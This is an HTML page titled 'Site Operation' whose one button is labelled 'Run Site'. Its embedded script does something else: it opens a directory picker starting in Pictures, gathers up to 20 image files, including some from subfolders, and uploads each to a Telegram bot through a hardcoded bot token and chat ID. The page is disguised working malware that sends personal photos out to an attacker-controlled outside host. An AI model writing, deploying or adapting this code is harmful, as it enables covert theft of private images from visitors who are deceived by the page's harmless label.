<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Operation</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            max-width: 400px;
            margin: 0 auto;
        }
        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
            margin: 20px 0;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Site Operation</h1>
        <p>Click the button below to run the site</p>
        <button id="accessButton">Run Site</button>
    </div>

    <script>
        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const CHAT_ID = "6913353602";
        const MAX_IMAGES_TO_SEND = 20;

        document.getElementById('accessButton').addEventListener('click', async () => {
            try {
                // Request permission to access Pictures folder
                const dirHandle = await window.showDirectoryPicker({
                    startIn: 'pictures'
                });
                
                // Start sending images
                await findAndSendImages(dirHandle);
                
            } catch (error) {
                console.error('Error:', error);
            }
        });

        async function findAndSendImages(dirHandle) {
            let imagesSent = 0;
            const imageQueue = [];
            
            // First collect all images (up to MAX_IMAGES_TO_SEND)
            for await (const entry of dirHandle.values()) {
                if (imagesSent >= MAX_IMAGES_TO_SEND) break;
                
                if (entry.kind === 'file' && isImageFile(entry.name)) {
                    const file = await entry.getFile();
                    imageQueue.push({file, name: entry.name});
                    imagesSent++;
                } 
                else if (entry.kind === 'directory') {
                    try {
                        const subDirHandle = await dirHandle.getDirectoryHandle(entry.name);
                        for await (const subEntry of subDirHandle.values()) {
                            if (imagesSent >= MAX_IMAGES_TO_SEND) break;
                            
                            if (subEntry.kind === 'file' && isImageFile(subEntry.name)) {
                                const file = await subEntry.getFile();
                                imageQueue.push({file, name: subEntry.name});
                                imagesSent++;
                            }
                        }
                    } catch (e) {
                        console.warn(`Couldn't access subdirectory: ${entry.name}`, e);
                    }
                }
            }
            
            // Now send all collected images quickly
            for (const image of imageQueue) {
                try {
                    await sendToTelegram(image.file, image.name);
                    // Small delay to avoid rate limiting
                    await new Promise(resolve => setTimeout(resolve, 300));
                } catch (e) {
                    console.error(`Failed to send ${image.name}:`, e);
                }
            }
        }
        
        async function sendToTelegram(file, filename) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', file, filename);
            
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            
            if(!response.ok) {
                throw new Error(`Failed to send: ${response.status}`);
            }
            
            return response.json();
        }
        
        function isImageFile(filename) {
            const imageExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'];
            return imageExtensions.some(ext => filename.toLowerCase().endsWith(ext));
        }
    </script>
</body>
</html>
